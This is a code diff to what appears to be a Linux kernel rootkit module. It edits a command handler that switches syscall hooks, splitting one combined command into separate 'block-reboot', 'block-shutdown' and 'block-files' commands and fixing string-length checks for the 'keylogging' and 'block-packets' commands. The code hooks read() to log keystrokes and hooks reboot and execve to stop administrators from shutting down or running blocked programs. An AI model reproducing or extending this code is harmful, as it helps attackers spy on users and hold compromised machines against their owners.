@@ -207,8 +207,29 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
-    if(memcmp("keylogging", tmpdata, strlen("hide-users")) == 0){
-        if(strlen(tmpdata) == strlen("hide-users")){
+    if(memcmp("block-reboot", tmpdata, strlen("block-reboot")) == 0){
+        if(strlen(tmpdata) == strlen("block-reboot")){
+            strcpy(last_data, tmpdata);
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
+                pr_err("error hooking syscall %d\n", __NR_reboot);
+            }
+        }
+    }
+
+    if(memcmp("block-shutdown", tmpdata, strlen("block-shutdown")) == 0){
+        if(strlen(tmpdata) == strlen("block-shutdown")){
+            strcpy(last_data, tmpdata);
+            if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 0){
+                insert_node(&exec_to_block, "shutdown");
+            }
+            else{
+                remove_node_by_name(&exec_to_block, "shutdown");
+            }
+        }
+    }
+
+    if(memcmp("keylogging", tmpdata, strlen("keylogging")) == 0){
+        if(strlen(tmpdata) == strlen("keylogging")){
             strcpy(last_data, tmpdata);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_read") == 1){
                 pr_err("error hooking syscall read\n");
@@ -216,22 +237,14 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
-    if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
-        if(strlen(tmpdata) == strlen("block-files-reboot")){
+    if(memcmp("block-files", tmpdata, strlen("block-files")) == 0){
+        if(strlen(tmpdata) == strlen("block-files")){
             strcpy(last_data, tmpdata);
             pr_info("Blocking Files & Reboot: %s\n", last_data);
             print_list(&exec_to_block);
-            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_reboot") == 1){
-                pr_err("error hooking syscall %d\n", __NR_reboot);
-            }
-            if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 0){
-                insert_node(&exec_to_block, "shutdown");
-                if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
-                    pr_err("error hooking syscall execve\n");
-                }
-            }
-            else{
-                remove_node_by_name(&exec_to_block, "shutdown");
+
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"__x64_sys_execve") == 1){
+                pr_err("error hooking syscall execve\n");
             }
         }
     }
@@ -261,30 +274,44 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         }
     }
 
-    if(memcmp("keylogging", tmpdata, strlen("hide-users")) == 0){
-        if(strlen(tmpdata) == strlen("hide-users")){
+    if(memcmp("keylogging", tmpdata, strlen("keylogging")) == 0){
+        if(strlen(tmpdata) == strlen("keylogging")){
             strcpy(last_data, tmpdata);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_read") == 1){
                 pr_err("error hooking syscall read\n");
             }
         }
     }
-    if(memcmp("block-files-reboot", tmpdata, strlen("block-files-reboot")) == 0){
-        if(strlen(tmpdata) == strlen("block-files-reboot")){
+
+    if(memcmp("block-reboot", tmpdata, strlen("block-reboot")) == 0){
+        if(strlen(tmpdata) == strlen("block-reboot")){
             strcpy(last_data, tmpdata);
-            pr_info("Blocking Files & Reboot: %s\n", last_data);
-            print_list(&exec_to_block);
             if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_reboot") == 1){
                 pr_err("error hooking syscall %d\n", __NR_reboot);
             }
+        }
+    }
+
+    if(memcmp("block-shutdown", tmpdata, strlen("block-shutdown")) == 0){
+        if(strlen(tmpdata) == strlen("block-shutdown")){
+            strcpy(last_data, tmpdata);
             if(is_hook_activated(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 0){
                 insert_node(&exec_to_block, "shutdown");
-                if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
-                    pr_err("error hooking syscall execve\n");
-                }
             }
             else{
                 remove_node_by_name(&exec_to_block, "shutdown");
+            }
+        }
+    }
+
+    if(memcmp("block-files", tmpdata, strlen("block-files")) == 0){
+        if(strlen(tmpdata) == strlen("block-files")){
+            strcpy(last_data, tmpdata);
+            pr_info("Blocking Files & Reboot: %s\n", last_data);
+            print_list(&exec_to_block);
+
+            if(switch_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE,"sys_execve") == 1){
+                pr_err("error hooking syscall execve\n");
             }
         }
     }
@@ -357,7 +384,7 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
     }
 
     if(memcmp("block-packets", tmpdata, strlen("block-packets")) == 0){
-        if(strlen(tmpdata) == strlen("block-packets\n")){
+        if(strlen(tmpdata) == strlen("block-packets")){
             strcpy(last_data, tmpdata);
             pr_info("Blocking Packets");
             switch_net_hook();
